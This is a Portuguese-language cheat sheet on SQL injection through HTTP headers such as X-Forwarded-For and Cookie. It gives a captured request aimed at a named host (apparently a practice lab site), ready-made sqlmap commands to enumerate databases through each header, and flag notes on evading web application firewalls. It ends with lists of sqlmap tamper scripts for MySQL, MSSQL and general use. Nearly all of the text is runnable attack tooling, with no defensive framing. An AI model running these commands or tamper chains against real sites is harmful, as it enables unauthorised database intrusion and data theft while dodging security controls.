
	       ------------------------------------  Manipulando headers para SQLinjection  -------------------------------------

	#https://en.wikipedia.org/wiki/List_of_HTTP_header_fields
	#https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers
	#https://github.com/sqlmapproject/sqlmap/tree/master/tamper - > scripts que o sqlmap possui.
	
	Forwarded (Headers) que merecem atenção:
	
	-> X-Forwarded-For Non-Standard - > Utilizado quando o site passa por um proxy reverso ou firewall. 
	- > X-Forwarded-Host Non-Standard
	- > X-Forwarded-Proto Non-Standard
	
	Exemplo: 
	Onde estará presente o X-Forwarded-for ? provavelmente, em sites que usam proxies.
	X-Forwarded-For: 
	 
	   IPcliente  ----------------------- > proxie reverso / balanceador de carga / firewall  ------------------------ > Servidor  
	192.168.100.2 ----------------------- > 	      200.200.250.250	   	------------------------- >    200.200.250.250 
	X-Forwarded-for					      X-Forwarded-for 
	
	O servidor recebe uma conexão do proxie/firewall. O ip do cliente é isolado e adicionado no X-Forwarded-for e passaado para o site para ele saber quem se conectou. 
	
	
	nano header.txt 
	
	GET /cat.php?id=3 HTTP/1.1
	Host: advanced.bancocn.com
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
	Cookie: cf_clearance=k.ZL3qaQDaabmNUv7DWMkU8Uqo3vyCKRpACHrxcoz_8-1655355922-0-150
	Upgrade-Insecure-Requests: 1
	
	X-Forwarded-For Non-Standard  
	X-Forwarded-Host Non-Standard
	X-Forwarded-Proto Non-Standard
		
	
	sqlmap -r header.txt -p X-Forwarded-For --dbs --flush-session --dbms=mysql --no-cast--proxy=http://127.0.0.1:8080 -v 
	sqlmap -r header.txt -p X-Forwarded-Host --dbs --flush-session --dbms=mysql --no-cast --proxy=http://127.0.0.1:8080 -v 
	sqlmap -r header.txt -p X-Forwarded-Proto --dbs --flush-session --dbms=mysql --no-cast --proxy=http://127.0.0.1:8080 -v 
	sqlmap -r header.txt -p Cookies --dbs --flush-session --dbms=mysql --no-cast --proxy=http://127.0.0.1:8080 -v 
	
	--identify-waf - > identificar firewall 
	--skip-waf não identifique o firewall  
	-p -> parâmetro que vc quer tentar fazer a injeção de códigos. ( no caso faremos no header ) 
	--proxy=http://127.0.0.1:8080 
	--dbms=mysql
	--no-cast (diminuir os payloads) fazer um 'bypass' dos parametros injetados 
	--tamper=TAMPER vai tentar fazer um bypass para cada banco de dados
	--no-cast -> diminuir o tamanho do payload, para ajudar a não ser identificado pelos WAF
	--tamper=script
	--risk=3 --level=5 - > aumentar os testes e "agressividade" do sqlmap aumentando a possibilidade do ataque de ser visto.
	--skip-waf - > desativa o scanner que o sqlmap faz do waf por padrão. 
	--is-dba

	Como usar o sqlmap? 
	1 ) Encontra o waf
	2 ) tamper pro bypass encontrado 
	3 ) --skip-waf sqlmap não identificar o firewall 

-------------------
General Tamper testing:

tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes

-------------------
MySQL:

tamper=TAMPER 
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
-------------------
MSSQL: 

tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
